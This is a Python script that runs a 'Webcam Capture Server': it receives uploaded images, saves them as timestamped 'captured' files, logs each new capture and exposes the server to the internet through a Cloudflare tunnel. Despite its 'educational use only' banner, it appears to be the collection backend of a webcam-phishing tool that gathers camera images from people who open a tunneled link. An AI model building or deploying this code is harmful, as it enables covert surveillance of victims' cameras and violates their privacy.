from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
from datetime import datetime
import subprocess
import time
import threading

class CamHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers.get('Content-Length', 0))
            content_type = self.headers.get('Content-Type', '')

            # Check for multipart form data
            if 'multipart/form-data' in content_type:
                boundary = content_type.split("boundary=")[-1]
                remainbytes = content_length
                line = self.rfile.readline()
                remainbytes -= len(line)

                if not boundary in line.decode():
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Content does not begin with boundary")
                    return

                # Read headers until we find filename
                line = self.rfile.readline()
                remainbytes -= len(line)

                if 'filename=' not in line.decode():
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"No file uploaded")
                    return

                # Skip Content-Type line
                line = self.rfile.readline()
                remainbytes -= len(line)

                # Skip empty line
                line = self.rfile.readline()
                remainbytes -= len(line)

                # Write file data
                os.makedirs("captured", exist_ok=True)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join("captured", f"captured_{timestamp}.jpg")

                with open(filename, 'wb') as out_file:
                    preline = self.rfile.readline()
                    remainbytes -= len(preline)
                    while remainbytes > 0:
                        line = self.rfile.readline()
                        remainbytes -= len(line)
                        if boundary.encode() in line:
                            preline = preline.rstrip(b'\r\n')
                            out_file.write(preline)
                            break
                        else:
                            out_file.write(preline)
                            preline = line

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Image uploaded successfully")
                print(f"[+] Captured image saved as: {filename}")
                return

        self.send_response(400)
        self.end_headers()
        self.wfile.write(b"Invalid request")

def start_cloudflared():
    try:
        print("\n[*] Starting Cloudflare tunnel...")
        subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:8080"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Cloudflared error: {e}")
    except FileNotFoundError:
        print("[!] Cloudflared not found. Please install it first.")

def monitor_captures():
    print("\n[*] Monitoring for captured images...")
    initial_files = set(os.listdir("captured")) if os.path.exists("captured") else set()

    while True:
        current_files = set(os.listdir("captured")) if os.path.exists("captured") else set()
        new_files = current_files - initial_files

        for file in new_files:
            print(f"[+] New capture: captured/{file}")

        initial_files = current_files
        time.sleep(2)

from colorama import Fore, init
init()  # Initialize colorama

if __name__ == "__main__":
    print(Fore.RED + """
    ########################################################
    # Webcam Capture Server - Educational Use Only         #
    # WARNING: Unauthorized access to devices is illegal   #
    # This is for security research/education only         #
    ########################################################
    """ + Fore.RESET)

    os.makedirs("captured", exist_ok=True)

    threading.Thread(target=monitor_captures, daemon=True).start()
    cloudflared_thread = threading.Thread(target=start_cloudflared, daemon=True)
    cloudflared_thread.start()

    print("\n[*] Starting web server at http://localhost:8080")
    server = HTTPServer(('localhost', 8080), CamHandler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.server_close()
